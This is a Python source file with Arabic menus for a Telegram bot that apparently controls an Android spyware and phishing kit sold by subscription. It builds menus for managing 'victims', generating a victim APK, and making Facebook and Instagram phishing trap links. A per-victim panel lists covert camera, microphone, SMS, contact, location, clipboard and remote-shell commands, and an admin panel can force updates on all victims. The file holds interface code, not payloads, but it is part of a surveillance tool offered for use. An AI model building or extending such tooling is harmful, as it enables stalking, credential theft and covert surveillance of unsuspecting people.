# bot_handlers/keyboards.py
# ============================================================
# كل الـ Keyboards
# ============================================================

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

from imports_manager import is_admin
from .templates import FACEBOOK_SITES, INSTAGRAM_SITES


# ══════════════════════════════════════════════════
# Main Menu
# ══════════════════════════════════════════════════
def main_menu(user_id=None):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("👥 إدارة الضحايا", callback_data="v_list"))
    markup.add(InlineKeyboardButton("📱 تطبيق الضحية (APK)", callback_data="v_new"))
    markup.add(InlineKeyboardButton("🌐 لوحة التحكم (ويب)", callback_data="open_dashboard"))
    markup.add(InlineKeyboardButton("🎭 الهندسة الاجتماعية", callback_data="gen_se"))
    markup.add(InlineKeyboardButton("🔍 محرك البحث", callback_data="search_menu"))
    markup.add(InlineKeyboardButton("🎯 جمع المعلومات (Silent)", callback_data="gen_silent"))
    markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
    markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
    markup.add(InlineKeyboardButton("📖 شرح البوت", callback_data="help_guide"))
    markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
    markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))

    if user_id and is_admin(user_id):
        markup.add(InlineKeyboardButton("👑 لوحة تحكم الأدمن", callback_data="admin_panel"))

    return markup


def main_menu_text(user_id=None):
    if user_id and is_admin(user_id):
        return (
            "👑 <b>القائمة الرئيسية</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "⚡ صلاحيات كاملة\n"
            "💎 VIP لا نهائي\n\n"
            "🎯 اختر أداة:"
        )
    return (
        "⚡ <b>القائمة الرئيسية</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 اختر أداة:"
    )


# ══════════════════════════════════════════════════
# Search Menu
# ══════════════════════════════════════════════════
def build_search_menu():
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("📱 بحث برقم الهاتف ✨", callback_data="search_phone"))
    m.add(InlineKeyboardButton("📧 بحث بالإيميل 🔒", callback_data="search_email_soon"))
    m.add(InlineKeyboardButton("👤 بحث باسم المستخدم 🔒", callback_data="search_username_soon"))
    m.add(InlineKeyboardButton("📘 بحث بفيسبوك 🔒", callback_data="search_fb_soon"))
    m.add(InlineKeyboardButton("📷 بحث بانستقرام 🔒", callback_data="search_ig_soon"))
    m.add(InlineKeyboardButton("📜 سجل البحثات", callback_data="search_history"))
    m.add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main"))
    return m


# ══════════════════════════════════════════════════
# Facebook / Instagram Templates
# ══════════════════════════════════════════════════
def build_facebook_sites_panel():
    m = InlineKeyboardMarkup()
    for key, tpl in FACEBOOK_SITES.items():
        m.add(InlineKeyboardButton(
            f"{tpl['emoji']} {tpl['name']}",
            callback_data=f"fb_site_{key}"
        ))
    m.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))
    return m


def build_instagram_sites_panel():
    m = InlineKeyboardMarkup()
    for key, tpl in INSTAGRAM_SITES.items():
        m.add(InlineKeyboardButton(
            f"{tpl['emoji']} {tpl['name']}",
            callback_data=f"ig_site_{key}"
        ))
    m.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))
    return m


# ══════════════════════════════════════════════════
# Silent Collector
# ══════════════════════════════════════════════════
def silent_collector_panel():
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("➕ لينك جديد", callback_data="silent_new"))
    m.add(InlineKeyboardButton("📊 الإحصائيات", callback_data="silent_stats"))
    m.add(InlineKeyboardButton("📋 آخر النتائج", callback_data="silent_recent"))
    m.add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main"))
    return m


# ══════════════════════════════════════════════════
# Help
# ══════════════════════════════════════════════════
def build_help_page_nav(index, total):
    """يبني أزرار التنقل لصفحات الشرح"""
    m = InlineKeyboardMarkup()
    nav = []
    if index > 0:
        nav.append(InlineKeyboardButton("⬅️ السابق", callback_data=f"help_page_{index - 1}"))
    if index < total - 1:
        nav.append(InlineKeyboardButton("التالي ➡️", callback_data=f"help_page_{index + 1}"))
    if nav:
        m.row(*nav)
    m.add(InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="back_to_main"))
    return m


# ══════════════════════════════════════════════════
# Victims
# ══════════════════════════════════════════════════
def victim_commands_panel(victim_id):
    m = InlineKeyboardMarkup()

    m.row(
        InlineKeyboardButton("📷 كاميرا أمامية", callback_data=f"vcmd_camfront_{victim_id}"),
        InlineKeyboardButton("📸 كاميرا خلفية", callback_data=f"vcmd_camback_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🎥 فيديو أمامية 10s", callback_data=f"vcmd_videofront_{victim_id}"),
        InlineKeyboardButton("🎥 فيديو خلفية 10s", callback_data=f"vcmd_videoback_{victim_id}"),
    )
    m.row(InlineKeyboardButton("🎙️ تسجيل صوت 10s", callback_data=f"vcmd_audio_{victim_id}"))
    m.row(
        InlineKeyboardButton("🔔 نغمة", callback_data=f"vcmd_sound_{victim_id}"),
        InlineKeyboardButton("🚨 إنذار", callback_data=f"vcmd_alarm_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("📱 معلومات الجهاز", callback_data=f"vcmd_info_{victim_id}"),
        InlineKeyboardButton("🔋 البطارية", callback_data=f"vcmd_battery_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("📨 SMS", callback_data=f"vcmd_sms_{victim_id}"),
        InlineKeyboardButton("📞 سجل المكالمات", callback_data=f"vcmd_calls_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("👥 جهات الاتصال", callback_data=f"vcmd_contacts_{victim_id}"),
        InlineKeyboardButton("📲 التطبيقات", callback_data=f"vcmd_apps_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🖼️ الصور", callback_data=f"vcmd_photos_{victim_id}"),
        InlineKeyboardButton("🎬 الفيديوهات", callback_data=f"vcmd_videos_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("📍 الموقع", callback_data=f"vcmd_location_{victim_id}"),
        InlineKeyboardButton("📶 معلومات WiFi", callback_data=f"vcmd_wifi_{victim_id}"),
    )
    m.row(InlineKeyboardButton("📋 الحافظة", callback_data=f"vcmd_clipboard_{victim_id}"))
    m.row(
        InlineKeyboardButton("📳 اهتزاز", callback_data=f"vcmd_vibrate_{victim_id}"),
        InlineKeyboardButton("🔊 صوت أقصى", callback_data=f"vcmd_volmax_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🔉 خفض الصوت", callback_data=f"vcmd_volmute_{victim_id}"),
        InlineKeyboardButton("⚡ صوت متوسط", callback_data=f"vcmd_volmid_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("⏯️ تشغيل/إيقاف", callback_data=f"vcmd_mediaplay_{victim_id}"),
        InlineKeyboardButton("⏭️ التالي", callback_data=f"vcmd_medianext_{victim_id}"),
    )
    m.row(InlineKeyboardButton("⏮️ السابق", callback_data=f"vcmd_mediaprev_{victim_id}"))
    m.row(
        InlineKeyboardButton("🌑 إطفاء الشاشة", callback_data=f"vcmd_screenoff_{victim_id}"),
        InlineKeyboardButton("🔒 قفل كامل", callback_data=f"vcmd_lock_{victim_id}"),
    )
    m.row(InlineKeyboardButton("🏠 الرئيسية", callback_data=f"vcmd_home_{victim_id}"))
    m.row(
        InlineKeyboardButton("✉️ إرسال SMS", callback_data=f"vcmd_sendsms_{victim_id}"),
        InlineKeyboardButton("📞 مكالمة", callback_data=f"vcmd_call_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🌐 فتح رابط", callback_data=f"vcmd_url_{victim_id}"),
        InlineKeyboardButton("💬 Toast", callback_data=f"vcmd_toast_{victim_id}"),
    )
    m.row(InlineKeyboardButton("💻 Shell", callback_data=f"vcmd_shell_{victim_id}"))
    m.row(
        InlineKeyboardButton("🔄 تحديث", callback_data=f"v_refresh_{victim_id}"),
        InlineKeyboardButton("✏️ تغيير الاسم", callback_data=f"v_rename_{victim_id}"),
    )
    m.row(InlineKeyboardButton("🗑️ حذف الضحية", callback_data=f"v_delete_{victim_id}"))
    m.row(InlineKeyboardButton("🔙 رجوع للضحايا", callback_data="v_list"))

    return m


# ══════════════════════════════════════════════════
# Updates
# ══════════════════════════════════════════════════
def build_update_panel():
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("📊 حالة التحديث", callback_data="upd_status"))
    m.add(InlineKeyboardButton("🚀 إجبار كل الضحايا على التحديث", callback_data="upd_force_all"))
    m.add(InlineKeyboardButton("🎯 تحديث ضحية محددة", callback_data="upd_target"))
    m.row(
        InlineKeyboardButton("🔍 فحص آخر Release", callback_data="upd_check_release"),
        InlineKeyboardButton("♻️ مسح Cache", callback_data="upd_clear_cache"),
    )
    m.row(
        InlineKeyboardButton("📜 سجل التحديثات", callback_data="upd_history"),
        InlineKeyboardButton("⚙️ إعدادات", callback_data="upd_settings"),
    )
    m.add(InlineKeyboardButton("🔙 رجوع للأدمن", callback_data="admin_panel"))
    return m
